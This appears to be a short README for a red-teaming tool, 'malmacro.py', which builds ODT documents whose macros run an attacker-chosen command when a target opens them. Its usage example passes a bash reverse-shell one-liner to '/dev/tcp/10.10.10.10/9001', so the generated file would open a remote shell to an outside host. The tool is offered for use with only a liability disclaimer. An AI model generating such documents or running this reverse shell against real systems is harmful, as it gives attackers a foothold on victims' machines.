## Malicious VBA Macro Generator
One general way to gain a foothold on a user's machine in a red-teaming engagement is the use of delivering a document that has a macro enabled that executes a command, which is triggered upon the user opening the document. This program generates one such document in ODT format (I may add Word, Excel and ODS documents later).

Note: For this to work, macros must be enabled on the target's machine.

```bash
$ python malmacro.py
Usage: malmacro.py <code_to_execute>

$ python malmacro.py "bash -i >& /dev/tcp/10.10.10.10/9001 0>&1"

$ ls
macro.odt  malmacro.odt  malmacro.py
```

## Disclaimer
This project is made for demonstrative and educational purposes only. I'm not liable for how you use it.
